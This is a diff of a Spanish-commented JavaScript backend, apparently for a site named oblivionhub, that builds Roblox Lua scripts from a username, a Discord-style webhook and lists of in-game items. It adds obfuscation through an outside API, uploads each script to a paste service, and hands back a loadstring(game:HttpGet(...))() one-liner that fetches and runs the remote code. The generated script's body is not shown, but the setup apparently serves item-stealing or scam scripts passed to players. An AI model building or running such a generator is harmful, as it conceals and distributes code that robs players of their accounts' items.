@@ -11,43 +11,64 @@ export default async function handler(req, res) {
     }
 
     try {
-        // Construir el script base
+        // 1. Construir el script completo
         const script = buildScript(username, webhook, mode, brainrots || [], skins || [], gears || []);
 
-        // Si NO se pide ofuscar, devolver el script normal
-        if (!shortEnabled) {
-            return res.status(200).json({ script });
+        let finalScript = script;
+        let obfuscated = false;
+        let obfuscationError = null;
+
+        // 2. Si se pide ofuscar, intentarlo (pero no fallar si no se puede)
+        if (shortEnabled) {
+            try {
+                console.log('Intentando ofuscar con WeAreDevs...');
+                finalScript = await obfuscateWithWeAreDevs(script);
+                obfuscated = true;
+                console.log('Ofuscación exitosa.');
+            } catch (error) {
+                console.error('Error al ofuscar:', error.message);
+                obfuscationError = error.message;
+                // No fallamos, seguimos con el script sin ofuscar
+                finalScript = script;
+                obfuscated = false;
+            }
         }
 
-        // --- MODO PRUEBA: Subir el script sin ofuscar a Pastefy interno ---
+        // 3. SIEMPRE subir a Pastefy interno (con o sin ofuscación)
         try {
-            console.log('Subiendo script a pastefy interno (sin ofuscar)...');
-            const pasteUrl = await saveToInternalPaste(script, `Script para ${username} (sin ofuscar)`, userId);
-            
+            const pasteUrl = await saveToInternalPaste(
+                finalScript,
+                `Script ${obfuscated ? 'ofuscado' : ''} para ${username}`,
+                userId
+            );
+
+            // Devolver el loadstring corto
             return res.status(200).json({
                 loadstring: `loadstring(game:HttpGet("${pasteUrl}"))()`,
-                script: script,
+                script: finalScript,
                 pasteUrl: pasteUrl,
-                obfuscated: false,
-                mode: 'test' // Indica que es modo prueba
+                obfuscated: obfuscated,
+                warning: obfuscationError || null
             });
+
         } catch (pasteError) {
-            console.error('Error al subir a Pastefy interno:', pasteError);
+            console.error('Error al guardar en Pastefy interno:', pasteError);
+            // Si falla el paste, devolver el script completo (fallback)
             return res.status(200).json({
-                script: script,
-                obfuscated: false,
-                error: `Error al subir a Pastefy interno: ${pasteError.message}`
+                script: finalScript,
+                obfuscated: obfuscated,
+                error: 'No se pudo guardar en Pastefy interno.'
             });
         }
 
     } catch (error) {
-        console.error('Error general en generate:', error);
+        console.error('Error general:', error);
         return res.status(500).json({ error: error.message });
     }
 }
 
 // ============================================================
-//  CONSTRUIR SCRIPT (incluye task.spawn según el modo)
+//  CONSTRUIR SCRIPT
 // ============================================================
 function buildScript(username, webhook, mode, brainrots, skins, gears) {
     function luaTable(arr, indent = '    ') {
@@ -94,12 +115,38 @@ end)`;
 }
 
 // ============================================================
+//  OFUSCAR CON WEAREDEVS
+// ============================================================
+async function obfuscateWithWeAreDevs(script) {
+    const response = await fetch('https://wearedevs.net/api/obfuscate', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ script: script })
+    });
+
+    if (!response.ok) {
+        const errorText = await response.text();
+        throw new Error(`WeAreDevs error (${response.status}): ${errorText}`);
+    }
+
+    const data = await response.json();
+
+    if (!data.success) {
+        throw new Error(data.error || 'WeAreDevs devolvió success: false');
+    }
+
+    const obfuscated = data.obfuscated;
+    if (!obfuscated) {
+        throw new Error('No se pudo obtener el script ofuscado.');
+    }
+    return obfuscated;
+}
+
+// ============================================================
 //  GUARDAR EN PASTEFY INTERNO (Supabase)
 // ============================================================
 async function saveToInternalPaste(content, title, userId) {
     const baseUrl = process.env.BASE_URL || 'https://oblivionhub.xyz';
-
-    console.log('Llamando a /api/paste con:', { content: content.length, title, userId });
 
     const response = await fetch(`${baseUrl}/api/paste`, {
         method: 'POST',
@@ -113,12 +160,10 @@ async function saveToInternalPaste(content, title, userId) {
     });
 
     if (!response.ok) {
-        const errorText = await response.text();
-        console.error('Error respuesta de /api/paste:', errorText);
-        throw new Error(`Error al guardar el paste: ${response.status} - ${errorText}`);
+        const error = await response.json();
+        throw new Error(error.error || 'Error al guardar el paste');
     }
 
     const data = await response.json();
-    console.log('Respuesta de /api/paste:', data);
     return data.url;
 }
